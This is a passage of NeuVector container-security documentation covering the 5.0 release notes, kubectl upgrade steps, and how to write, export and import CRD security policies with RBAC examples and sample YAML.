localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-scanner-pod-87474dcff-s8vgt 1/1 Running 0 114s 10.42.0.31 localhost.localdomain &lt;none&gt; &lt;none&gt;   5.0.0 General Availability (GA) Release May 2022​  Enhancements​  Automated Promotion of Group Modes. Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet). Used for ingress connections to web application pods as well as outbound connections to api-services to enforce api security.CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. This deployment pulls from the mirrored Rancher repository (e.g. rancher/mirrored-neuvector-controller:5.0.0) and deploys into the cattle-neuvector-system namespace. NOTE: Requires updated Rancher release 2.6.5 May 2022 or later, and only admin and cluster owner roles are supported at this time.Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy. Configure proxy in Settings -&gt; Configuration, and enable proxy when configuring federation connections.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.Support Microsoft Teams format for webhooks.Support AD/LDAP nested groups under mapped role group.Support clusterrolebindings or rolebindings with group info in IDP for Openshift.Allow network rules and admission control rules to be promoted to a Federated rule.  Bug Fixes​  Fix issue of worker federation role backup should restore into non-federated clusters.Improve page loading times for large number of CVEs in Security Risks -&gt; VulnerabilitiesAllow user to switch mode when they select all groups in Policy -&gt; Groups menu. Warn if the Nodes group is also selected.Collapse compliance check items of the same name and make expandable.Enhance security of gRPC communications.Fixed: unable to get correct workload privileged info in rke2 setup.Fix issue with support of openSUSE Leap 15.3 (k8s/crio).  Other Updates​  Helm chart update appVersion to 5.0.0 and chart version to 2.2.0Removed serverless scanning feature/menu.Removed support for Jfrog Xray scan result integration (Artifactory registry scan is still supported).Support for deployment on ECS is no longer provided. The allinone should still be able to be deployed on ECS, however, the documentation of the steps and settings is no longer supported.  ","version":"5.2","tagName":"h3"},{"title":"Upgrading from NeuVector 4.x to 5.x (prior to 5.2.x)​","type":1,"pageTitle":"5.x Release Notes","url":"/5.2/releasenotes/5x#upgrading-from-neuvector-4x-to-5x-prior-to-52x","content":" note The instructions below apply to upgrades to 5.0.x and 5.1.x. For 5.2.x, service accounts and bindings have changed, and should be reviewed to plan upgrades.  For Helm users, update to NeuVector Helm chart 2.0.0 or later. If updating an Operator or Helm install on OpenShift, see note below.  Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/admission-crd-k8s-1.19.yaml   Create a new Admission, DLP and WAF clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Update image names and paths for pulling NeuVector images from Docker hub (docker.io), e.g.  neuvector/manager:5.0.0neuvector/controller:5.0.0neuvector/enforcer:5.0.0neuvector/scanner:latestneuvector/updater:latest  Optionally, remove any references to the NeuVector license and registry secret in Helm charts, deployment yaml, configmap, scripts etc, as these are no longer required to pull the images or to start using NeuVector.  Note about SCC and Upgrading via Operator/Helm  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4 or Helm to 2.0.0, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged   Beta 1 version released April 2022​  Feature complete, including Automated Promotion of Group Modes. Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Tags for Enforcer, Manager, Controller: 5.0.0-b1 (e.g. neuvector/controller:5.0.0-b1)  Preview.3 version released March 2022​  important To update previous preview deployments for new CRD WAF, DLP and Admission control features, please update the CRD yaml and add new rbac/role bindings: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/latest/crd-k8s-1.19.yaml kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Enhancements​  Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet)CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. NOTE: Requires updated Rancher release (date/version TBD).Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.  Bug Fixes​  Fix issue of worker federation role backup should restore into non-federated clusters.  Preview.2 version released Feb 2022​  Minor file and license changes in source, no features added.  Support for deployment on AWS ECS Deprecated​  Support for deployment on ECS is no longer provided. The allinone should still be able to be deployed on ECS, however, the documentation of the steps and settings is no longer supported.  5.0 'Tech Preview' January 2022​  Enhancements​  First release of an unsupported, 'tech-preview' version of NeuVector 5.0 open source version.Add support for OWASP Top-10, WAF-like rules for detecting network attacks in headers or body. Includes support for CRD definitions of signatures and application to appropriate Groups.Removes Serverless scanning features.  Bug Fixes​  TBD  Other​  Helm chart v1.8.9 is published for 5.0.0 deployments. If using this with the preview version of 5.0.0 the following changes should be made to values.yml: Update the registry to docker.ioUpdate image names/tags to the preview version on Docker hubLeave the imagePullSecrets empty ","version":"5.2","tagName":"h3"},{"title":"Vulnerability Scanning, Compliance Testing, and Admission Controls","type":0,"sectionRef":"#","url":"/5.2/scanning","content":"Vulnerability Scanning, Compliance Testing, and Admission Controls Full Lifecycle Image and Container Scanning, CIS Benchmarks for Security, and Compliance","keywords":"","version":"5.2"},{"title":"CRD - Custom Resource Definitions","type":0,"sectionRef":"#","url":"/5.2/policy/usingcrd","content":"","keywords":"","version":"5.2"},{"title":"NeuVector CRD for Policy As Code​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#neuvector-crd-for-policy-as-code","content":" NeuVector custom resource definitions (CRDs) can be used by various teams to automatically define security policies in the NeuVector container security platform. Developers, DevOps, DevSecOps, and Security teams can collaborate to automate security policies for new or updated applications deployed to production. CRDs can also be used to enforce global security policies across multiple Kubernetes clusters.  note CRDs are supported in Kubernetes 1.11 and later. Deploying the NeuVector security rule CRD in earlier versions may not result in an error, but the CRD will not be processed.  CRD's can be used to support many use cases and workflows:  Define security policy during application development, to push into production.Learn behavior using NeuVector and export the CRD for review before pushing into production.Migrate security policies from staging to production clusters.Replicate rules across multiple replicated clusters in hybrid or multi-clouds.Enforce global security policies (see examples for this at bottom).  CRD's bring many benefits, including:  Define / declare the security policy, as code.Version and track the security policies the same as application deployment manifests.Define the allowed behavior of any application including network, file and process behavior.  Supported Resource Types​  NeuVector supports two kinds of custom resource definitions. They are the NvSecurityRule and NvClusterSecurityRule. The difference among the two comes down to the boundary set by the definition of the scope. The NvSecurityRule resource is scoped at the namespace level, whereas the NvClusterSecurityRule is scoped at the cluster level. Either of the resource types can be configured in a yaml file and can be created during deployment, as shown in the deployment instructions and examples for NeuVector.  The significance of the NvSecurityRule resource type with a scope of namespace lies in the enforcement of the configured domain of the target group, which must match the configured namespace in the NeuVector’s CRD security policy. This provides enforcement to prevent unwanted cross-namespace policy creation which affect a Target-Group policy rule.  For the NvClusterSecurityRule custom resource definition, this has a cluster level scope, and therefore, does not enforce any namespace boundary on a defined target. However, the user-context that is used for importing the CRD-yaml file must have the necessary permissions to access or reside in the same namespace as the one configured in the CRD-yaml file, or the import will be rejected.  Enabling CRD SupportAs described in the Kubernetes and OpenShift deployment sections (Deploying NeuVector), the appropriate clusterroles and clusterrole bindings for custom resources and NvSecurityRules should be added first.  Then NvSecurityRule and NvClusterSecurityRule should be created using the sample yaml in those sections. NeuVector CRDs can now be deployed.  ","version":"5.2","tagName":"h3"},{"title":"Generating a Sample NeuVector CRD​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#generating-a-sample-neuvector-crd","content":" The simplest way to see how the yaml file format looks for a NeuVector CRD is to export it from the NeuVector Console. After you have tested your application while NeuVector is in Discover mode learning the network, file, and process behavior, you can export the learned policy.  Go to the Policy -&gt; Groups menu and click on Export Group Policy from the upper right.    Then select the Groups that you wish to export, such as the three in the demo namespace above. Inspect the saved CRD yaml below to see how the NeuVector network, process, and file rules are expressed.  note In addition to the selected group(s), all 'linked' groups will also be exported. A linked group is any other group that a selected group will connect to or from as allowed by a network rule.  Sample Exported CRD  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.nginx-pod.demo namespace: demo spec: egress: - selector: criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo action: allow applications: - HTTP name: nv.node-pod.demo-egress-0 ports: any file: [] ingress: - selector: criteria: - key: service op: = value: exploit.demo - key: domain op: = value: demo name: nv.exploit.demo action: allow applications: - HTTP name: nv.nginx-pod.demo-ingress-0 ports: any process: - action: allow name: nginx path: /usr/sbin/nginx - action: allow name: pause path: /pause - action: allow name: ps path: /bin/ps target: selector: criteria: - key: service op: = value: nginx-pod.demo - key: domain op: = value: demo name: nv.nginx-pod.demo policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.node-pod.demo namespace: demo spec: egress: - selector: criteria: - key: address op: = value: google.com name: test action: allow applications: - SSL name: test-egress-1 ports: any - selector: criteria: - key: service op: = value: redis-pod.demo - key: domain op: = value: demo name: nv.redis-pod.demo action: allow applications: - Redis name: nv.redis-pod.demo-egress-2 ports: any - selector: criteria: - key: service op: = value: kube-dns.kube-system - key: domain op: = value: kube-system name: nv.kube-dns.kube-system action: allow applications: - DNS name: nv.kube-dns.kube-system-egress-3 ports: any file: [] ingress: [] process: - action: allow name: curl path: &quot;&quot; - action: allow name: node path: /usr/bin/nodejs - action: allow name: pause path: /pause - action: allow name: ps path: /bin/ps - action: allow name: sh path: /bin/dash - action: allow name: whoami path: /usr/bin/whoami target: selector: criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo policymode: Protect - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.redis-pod.demo namespace: demo spec: egress: [] file: [] ingress: [] process: - action: allow name: pause path: /pause - action: allow name: redis-server path: /usr/local/bin/redis-server target: selector: criteria: - key: service op: = value: redis-pod.demo - key: domain op: = value: demo name: nv.redis-pod.demo policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.kube-dns.kube-system namespace: kube-system spec: egress: null file: null ingress: null process: null target: selector: criteria: - key: service op: = value: kube-dns.kube-system - key: domain op: = value: kube-system name: nv.kube-dns.kube-system policymode: Monitor - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.exploit.demo namespace: demo spec: egress: null file: null ingress: null process: null target: selector: criteria: - key: service op: = value: exploit.demo - key: domain op: = value: demo name: nv.exploit.demo policymode: Monitor kind: List metadata: null   For example:  This is a namespaced CRD, of NvSecurityRulenginx-pod.demo can talk to node-pod.demo over HTTP, and allowed processes are listednode-pod.demo can talk to redis-pod.demo using the Redis protocolThe policymode of the services are set to Monitor modenode-pod.demo is allowed to egress to google.com using SSLGroup names such as nv.node-pod.demo are referenced but not defined in the CRD, so are expected to already exist when deployed. See below for defining Groups.  ","version":"5.2","tagName":"h3"},{"title":"Policy Mode Configuration and Group Definition​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#policy-mode-configuration-and-group-definition","content":" Policy mode configuration and Group definition is supported within the CRD configuration yaml file. With policymode configured in the yaml configuration file, importing such file will set the target group to this value for the CRD import.  important The imported target policy mode is not allowed to be modified from the NeuVector console (Policy -&gt; Groups). For example, once the mode is set to Monitor, it can only be changed through CRD modification, not through the console.  note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration.  Policy Mode Configuration Requirements​  Mode only applies to the configured Target groupThe target group configuration must have the format nv.SERVICE_NAME.DOMAIN. Example: nv.xxx.yyyxxx.yyy=SERVICEyyy=DOMAIN Supported values are Discover, Monitor, and ProtectThe target group must contain the key-value pair key: serviceA configured key: domain must match the service domain suffix with the configured service key-value pair  Policy Mode Configuration Yaml file Example   target: policymode: Protect selector: name: nv.xxx.yyy criteria: - key: service #1 of 2 Criteria must exist value: xxx.yyy op: &quot;=&quot; - key: domain #2 of 2 Criteria must exist value: yyy op: &quot;=&quot;   ","version":"5.2","tagName":"h3"},{"title":"CRD Policy Rules Syntax and Semantics​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#crd-policy-rules-syntax-and-semantics","content":" Group Name  Avoid using names which start with fed., nv.ip., host:, or workload: which are reserved for federated groups or ip based services.You can use node, external, or containers as a group name. However, this will be the same as the reserved default group names, so a new group will not be created. Any group definition criteria in the CRD will be ignored, but the rules for the group will be processed. The new rules will be shown under the group name.Meets the criteria: ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$Must not begin with fed, workload, or nv.ipIf the name has the format as nv.xxx.yyy, then there must exist a matching service and domain definition, or the import validation will fail. Please refer to the above Policy Mode Configuration for details.If the group name to be imported already exists in the destination system, then the criteria must match between the imported CRD and the one in the destination system. If there are differences, the CRD import will be rejected.  Policy Name  Needs to be unique within a yaml file.Cannot be empty.  Ingress  Is the traffic inbound to the target.  Egress  Is the traffic leaving from the target.  Criteria  Must not be empty unless the name is nodes, external, or containersname - If the name has the service format nv.xxx.yyy, then refer to the above section Policy Mode Configuration section detailskey - The key conforms to the regular expression pattern ^[a-zA-Z0-9]+[.:a-zA-Z0-9_-]*$op (operation) string = &quot;=&quot;string = &quot;!=&quot;string = &quot;contains&quot;string = &quot;prefix&quot;string = &quot;regex&quot;string = &quot;!regex&quot; value - A string without limitationskey - Must not be emptyop - Operator If the operator is equal (=) or not-equal (!=), then its’ value must not be empty.If the operator is equal (=) or not-equal (!=) with a value (such as * or ?), then the value cannot have any regular expresssion format like ^$.Example:Key: serviceOp : =Value: ab?c*e^$ (this is incorrect) Action - Allow or denyApplications (supported values) ActiveMQApacheCassandraConsulCouchbaseCouchDBDHCPDNSEchoElasticSearchetcdGRPCHTTPJettyKafkaMemcachedMongoDBMSSQLMySQLnginxNTPOraclePostgreSQLRabbitMQRadiusRedisRTSPSIPSparkSSHSSLSyslogTFTPVoltDBWordpressZooKeeper Port - The specified format is xxx/yyy. Where xxx=protocol(tcp, udp), and yyy=port_number (0-65535). TCP/123 or TCP/anyUDP/123 or UDP/123ICMP123 = TCP/123 Process - A list of process with action, name, path for each action: allow/deny #This action has precedence over the file access rule. This should be set to allow if the intent is to allow the file access rule to take effect.name: process namepath: process path (optional) File - A list of file access rules; these apply only to the defined target container group app: list of appsbehavior: block_access / monitor_change #This blocks access to the defined filter below. If monitor_change is chosen, then a security-event will be generated from the NeuVector’s webconsole Notifications &gt; Security events page.filter: path/filenamerecursive: true/false  ","version":"5.2","tagName":"h3"},{"title":"RBAC Support with CRDs​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#rbac-support-with-crds","content":" Utilizing Kubernetes existing RBAC model, NeuVector extends the CRD (Custom Resource Definition) to support RBAC by utilizing Kubernetes’s Rolebinding in association with the configured Namespace in the NeuVector configured CRD rules when using the NvSecurityRule resource-type. This configured Namespace is then used to enforce the configured Target, which must reside in this namespace configured in the NeuVector security policy. When rolebinding a defined clusterrole, this can be used to bind to a Kubernetes User or Group. The two clusterrole resources types that NeuVector supports are NvSecurityRule and NvClusterSecurityRule.  Rolebinding &amp; Clusterolebinding with 2 Users in different Namespaces to a Clusterrole (NvSecurityRules &amp; NvClusterSecurityRules resources)  The following illustrates a scenario creating one Clusterrole containing both resources (NvSecurityRules and NvClusterSecurityRules) to be bound to two different users.  One user (user1) belongs to Namespace (ns1), while the other user (user2) belongs to Namespace (ns2). User1 will Rolebind to this created Clusterrole (nvsecnvclustrole), while User2 is Clusterrolebind to this same Clusterrole (nvsecnvclustrole).  The key takeaway here is to illustrate that using Rolebinding, this will have Namespace-Level-Scope, whereas using Clusterrolebinding will have Cluster-Level-Scope. User1 will Rolebind (Namespace-Level-Scope), and User2 will be Clusterrolebind (Cluster-Level-Scope). This matters most during RBAC enforcement based on the scope-level that bounds the created users access.  Example using 2 different types of defined yaml files, and the effect of using each user  Create a Clusterrole containing both NvSecurityRules and NvClusterSecurityRules resources. Note: Notice that this clusterrole has 2 resources configured, nvsecurityrules and nvclustersecurityrules. Example (nvsecnvclustroles.yaml):  apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: nvsecnvclustrole rules: - apiGroups: - neuvector.com resources: - nvsecurityrules - nvclustersecurityrules verbs: - list - delete - create - get - update - apiGroups: - apiextensions.k8s.io resources: - customresourcedefinitions verbs: - get - list   Create 2 test yaml-files. One for the NvSecurityRules, and the other for the NvClusterSecurityRules resource. Sample NvSecurityRules nvsecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1crd namespace: ns1 spec: target: selector: name: nv.nginx-pod.ns1 criteria: - key: service value: nginx-pod.ns1 op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: domain value: demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Sample NvClusterSecurityRules nvclustersecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: rbacnvclustmatchnamespacengtargserving namespace: nvclusterspace spec: target: policymode: Protect selector: name: nv.nginx-pod.eng criteria: - key: service value: nginx-pod.eng op: &quot;=&quot; - key: domain value: eng op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: service value: nginx-pod.demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Switching the user-context to user1 (belongs to the ns1 Namespace) has a Rolebind to the NvSecurityRules resource, who is Namespace bound to the Namespace ns1. Therefore, importing test yaml file (kubectl create –f nvsecurity.yaml should be allowed since this yaml file configuration has the NvSecurityRules resource and the Namespace that this user is bound to.  If there is an attempt to import the test yaml file (nvclustersecurity.yaml ) however, this will be denied since the import CRD yaml file is defined with the resource NvClusterSecurityRules that has a Cluster-Scope, but user1 was Rolebind with a Namespace-Scope. Namespace-scope has a lower privilege than Cluster-Scope. Therefore, Kubernetes RBAC will deny such a request.  Example Error Message:  Error from server (Forbidden): error when creating &quot;rbacnvclustnamespacengtargnvclustingress.yamltmp&quot;: nvclustersecurityrules.neuvector.com is forbidden: User &quot;user1&quot; cannot create resource &quot;nvclustersecurityrules&quot; in API group &quot;neuvector.com&quot; at the cluster scope   Next, we can switch the user-context to user2 with a broader scope privilege, cluster-level-scope. This user2 has a Clusterrolebinding that is not Namespace bound, but has a cluster-level-scope, and associates with the NvClusterSecurityRules resource.  Therefore, using user2 to import either yaml file (nvsecurity.yaml or nvclustersecurity.yaml) will be allowed, since this user’s Clusterrolebinding is not restricted to either resource NvSecurityRules (Namespace-Scope) or NvClusterSecurityRules (Cluster-Scope).  ","version":"5.2","tagName":"h3"},{"title":"Expressing Network Rules (Ingress, Egress objects) in CRDs​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#expressing-network-rules-ingress-egress-objects-in-crds","content":" Network rules expressed in CRDs have an Ingress and/or Egress object, which define the allowed incoming and outgoing connections (protocols, ports etc) to/from the workload (Group). Each network rule in NeuVector must have a unique name in a CRD. Note that in the console, network rules only have a unique ID number.  If the 'To' (destination) of the rule is a learned, discovered group, upon export NeuVector prepends the 'nv.' identifier to the name. For example &quot;nv.redis-master.demo-ingress-0&quot;. For both discovered and custom groups, NeuVector also appends a unique name identifier, such as '-ingress-0' in the rule name 'nv.redis-master.demo-ingress-0. For CRD rule names, the 'nv.' identifier is NOT required, and is added to exported rules for clarity. For example:   ingress: - action: allow applications: - Redis name: nv.redis-master.demo-ingress-0   Custom, user created groups are not allowed to have the 'nv.' prefix. Only discovered/learned groups with the domain and service objects should have the prefix. For example:   - action: allow applications: - HTTP name: nv.node-pod.demo-egress-1 ports: any priority: 0 selector: comment: &quot;&quot; criteria: - key: service op: = value: node-pod.demo - key: domain op: = value: demo name: nv.node-pod.demo   ","version":"5.2","tagName":"h3"},{"title":"Customized Configurations for Deployed Applications​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#customized-configurations-for-deployed-applications","content":" With the use of a customized CRD yaml file, this enables you to customize network security rules, file access rules, and process security rules, all bundled into a single configuration file. There are multiple benefits to allow these customizations.  First, this allows the same rules to be applied on multiple Kubernetes environments, allowing synchronization among clusters.Second, this allows preemptive rules deployment prior to the applications coming online, which provides a proactive and effective security rules deployment workflow.Third, this allows the policymode to change from an evaluation one (such as Discover or Monitor), to one that protects the final staging environment.  These CRD rules within a yaml file can be imported into the NeuVector security platform through the use of Kubernetes CLI commands such as 'kubectl create –f crd.yaml'. This empowers the security team to tailor the security rules to be applied upon various containers residing in the Kubernetes environment.  For example, a particular yaml file can be configured to enable the policymode to Discover or Monitor a particular container named nv.alpine.ns1 in a staging cluster environment. Moreover, you can limit ssh access for a configured target container nv.alpine.ns1. to another container nv.redhat.ns2.  Once all the necessary tests and evaluations of such security rules are deemed correct, then you can migrate this to a production cluster environment simultaneous to the application deployments by using the NeuVector policy migration feature, which will be discussed later in this section.  Examples of CRD configurations that perform these functions  The following is a sample snippet of such configurations  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1global namespace: ns1 #The target's native namespace spec: target: selector: name: nv.alpine.ns1 criteria: - key: service value: alpine.ns1 #The source target's running container op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; egress: - selector: name: egress criteria: - key: service value: nv.redhat.ns2 #The destination's running container op: &quot;=&quot; ports: tcp/22 #Denies ssh to the destination container nv.redhat.ns2 applications: - SSH action: deny name: egress file: #Applies only to the defined target container group - app: - chmod #The application chmod is the only application allowed to access, while all other apps are denied. behavior: block_access #Supported values are block_access and monitor_change. This blocks access to the defined filter below. filter: /tmp/passwd.txt recursive: false process: - action: allow #This action has precedence over the file access rule. This should be allowed if the intent is to allow the file access rule to take effect. name: chmod # This configured should match the application defined under the file section. path: /bin/chmod   The above snippet is configured to enforce ssh access from the target group container nv.alpine.ns1 to the egress group nv.redhat.ns2. In addition, the enforcement of file access and the process rules are defined and applied to the configured target container nv.alpine.ns1. With this bundled configuration, we have allowed the defined network, file, and process security rules to act upon the configured target group.  ","version":"5.2","tagName":"h3"},{"title":"Policy Groups and Rules Migration Support​","type":1,"pageTitle":"CRD - Custom Resource Definitions","url":"/5.2/policy/usingcrd#policy-groups-and-rules-migration-support","content":" NeuVector supports the exporting of certain NeuVector group types from a Kubernetes cluster in a yaml file and importing into another Kubernetes cluster by utilizing native kubectl commands.  Migration Use Cases  Export tested CRD groups and security rules that are deemed “production ready” from a staging k8s cluster environment to a production k8s cluster environment.Export learned security rules to be migrated from a staging k8s environment to a production k8s environment.Allow the modification of the policymode of a configured Target group, for instance, such as Discover or Monitor mode in a staging environment, to Protect mode in a production environment.  Supported Export Conditions  Target, Ingress, Egress, Self-learned  Example of groups export  Exported groups with a configured attribute as domain=xx are exported with the Resource-Type NvsecurityRule along with the namespace.    Example of an exported group yaml file with the NvsecurityRule resource type   kind: NvSecurityRule metadata: name: nv.nginx-pod.neuvector namespace: neuvector spec: egress: [] file: [] ingress: [] process: [] target: selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector policymode: Discover   Exported groups without the defined criteria as domain=xx (Namespace) are exported with a Resource-Type NvClusterSecurityRule and a Namespace as default. Examples of Exported groups without a Namespace are external, container, etc.  Example of an exported group yaml file with the NvClusterSecurityRule resource type   kind: NvClusterSecurityRule metadata: name: egress namespace: default spec: egress: [] file: #File path profile applicable to the Target group only, and only applies to self-learned and user create groups - app: - vi - cat behavior: block_access filter: /etc/mysecret #Only vi and cat can access this file with “block_access”. recursive: false ingress: - selector: criteria: - key: service op: = value: nginx-pod.neuvector - key: domain op: = value: neuvector name: nv.nginx-pod.neuvector #Group Name action: allow applications: - Apache - ElasticSearch name: egress-ingress-0 #Policy Name ports: tcp/9400 process: #Process profile applicable to the Target group only, and only applies to self-learned and user create groups. - action: deny #Possible values are deny and allow name: ls path: /bin/ls #This example shows it denies the ls command for this target. target: selector: criteria: - key: service op: = value: nginx-pod.demo name: egress #Group Name policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ingress namespace: demo spec:   note The CRD import behavior ignores the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration.  Unsupported Export Group-Types  FederatedIP-Based (unsupported for learned service IP only, custom user created IP groups are supported)  Import Scenarios  The import will create new groups in the destination system if the groups do not 